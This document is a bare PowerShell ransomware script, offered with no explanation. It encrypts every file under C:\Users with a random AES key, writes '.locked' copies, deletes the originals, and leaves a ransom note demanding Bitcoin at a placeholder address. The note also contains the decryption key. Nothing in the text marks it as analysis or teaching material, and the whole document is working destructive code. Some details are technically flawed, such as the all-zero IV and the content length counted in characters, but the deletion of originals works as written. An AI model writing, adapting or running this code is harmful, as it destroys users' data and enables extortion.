$key = [Convert]::ToBase64String((1..32 | ForEach-Object {Get-Random -Maximum 256}))
$files = Get-ChildItem -Path "C:\Users" -Recurse -File
foreach ($file in $files) {
    $content = Get-Content -Path $file.FullName -Raw
    $encrypted = [Convert]::ToBase64String((New-Object Security.Cryptography.AesManaged).CreateEncryptor([Convert]::FromBase64String($key), (New-Object byte[] 16)).TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($content), 0, $content.Length))
    Set-Content -Path ($file.FullName + ".locked") -Value $encrypted
    Remove-Item -Path $file.FullName
}
Set-Content -Path "C:\RansomNote.txt" -Value "Your files are locked! Send 1 BTC to 1FakeBitcoinAddress to get the key: $key"
